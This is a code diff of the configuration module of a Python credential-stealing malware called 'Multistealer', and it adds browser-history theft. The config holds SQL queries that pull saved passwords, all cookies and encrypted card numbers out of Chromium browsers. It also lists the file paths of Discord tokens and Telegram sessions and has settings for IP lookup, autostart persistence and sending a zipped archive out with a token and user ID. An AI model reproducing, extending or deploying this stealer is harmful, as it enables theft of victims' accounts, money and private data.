@@ -10,20 +10,21 @@ user = GetUserName()
 @dataclass
 class ChromiumConfig:
 
-    Variables: tuple = ("browser_name", "storage_path", "storage_folder", "state_path", "browser_path", "statuses", "errors")
+    Variables: tuple = ("browser_name", "storage_path", "state_path", "browser_path", "statuses", "errors")
     PasswordsSQL: str = "SELECT action_url, username_value, password_value FROM logins"
     CookiesSQL: str = "SELECT * FROM cookies"
     CardsSQL: str = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
+    HistorySQL: str = "SELECT url FROM visits"
+    HistoryLinksSQL: str = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
 
 @dataclass
 class MultistealerConfig:
 
     ZipName: str = f"{user}-st"
-    StoragePath: str = rf"{environ['USERPROFILE']}\AppData"
-    StorageFolder: str = "stink"
+    StoragePath: str = rf"{environ['USERPROFILE']}\AppData\stink"
 
-    Functions: tuple = ("system", "screen", "cookies", "passwords", "processes", "cards", "discord", "telegram")
+    Functions: tuple = ("system", "screen", "cookies", "passwords", "history", "processes", "cards", "discord", "telegram")
 
     ChromePaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
@@ -55,14 +56,14 @@ class MultistealerConfig:
 class SystemConfig:
 
     User: str = user
-    Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
+    Variables: tuple = ("storage_path", "folder", "statuses", "errors")
     IPUrl: str = "https://api.ipify.org/"
 
 
 @dataclass
 class SenderConfig:
 
-    Variables: tuple = ("zip_name", "storage_path", "storage_folder", "token", "user_id", "errors")
+    Variables: tuple = ("zip_name", "storage_path", "token", "user_id", "errors")
     UserAgent: str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
 
@@ -79,11 +80,11 @@ class AutostartConfig:
 class DiscordConfig:
 
     TokensPath: str = rf"C:\Users\{user}\AppData\Roaming\Discord\Local Storage\leveldb"
-    Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
+    Variables: tuple = ("storage_path", "folder", "statuses", "errors")
 
 
 @dataclass
 class TelegramConfig:
 
     SessionsPath: str = rf"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"
-    Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
+    Variables: tuple = ("storage_path", "folder", "statuses", "errors")
